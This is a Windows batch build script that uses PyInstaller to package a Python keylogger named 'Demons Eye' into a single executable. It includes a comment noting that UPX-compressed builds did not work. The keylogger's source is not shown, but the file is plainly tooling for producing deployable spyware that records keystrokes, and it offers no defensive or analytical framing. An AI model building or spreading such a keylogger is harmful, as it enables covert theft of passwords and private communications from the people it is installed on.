@echo off
rem Executable creator for python code

echo Building Demons Eye keylogger
rem remove --noupx option if you want a compressed file.
rem but in the last tests compressend files do not work
rem pyinstaller -F --clean demonseye.py
pyinstaller -F --noupx --clean demonseye.py


